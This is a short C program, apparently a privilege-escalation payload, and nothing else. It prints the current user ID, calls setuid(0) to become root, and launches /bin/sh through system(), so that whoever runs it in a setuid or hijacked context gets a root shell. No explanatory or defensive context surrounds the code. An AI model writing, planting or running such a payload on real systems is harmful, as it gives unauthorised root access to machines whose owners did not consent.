#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("[+] Current UID: %d\n", getuid());
    printf("[+] Switching to /bin/sh as root...\n");
    setuid(0);  // ensure we become root
    system("/bin/sh");
    return 0;
}
